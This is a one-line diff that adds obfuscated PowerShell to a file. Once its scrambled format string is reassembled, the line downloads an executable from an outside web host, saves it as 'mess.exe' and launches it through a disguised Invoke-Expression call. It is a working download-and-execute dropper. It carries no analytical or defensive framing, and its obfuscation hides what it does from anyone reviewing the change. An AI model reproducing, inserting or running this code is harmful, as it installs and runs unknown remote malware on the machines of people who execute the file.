@@ -1,0 +1,1 @@
+﻿((("{9}{8}{1}{0}{22}{13}{12}{21}{7}{3}{2}{16}{11}{10}{19}{5}{20}{17}{14}{15}{4}{18}{6}"-f 'ct ','ew-Obje','/i','om','c','exe','}','orldnit.c','N','(','xe{0}','e','File({0}http:/','.Download',');Star','t-Pro','gbo.','}','ess {0}mess.exe{0',',{0}mess.','{0','/w','System.Net.WebClient)'))  -F  [cHAr]39) |.( $veRboSEPREfEreNCE.tostRInG()[1,3]+'x'-joiN'')
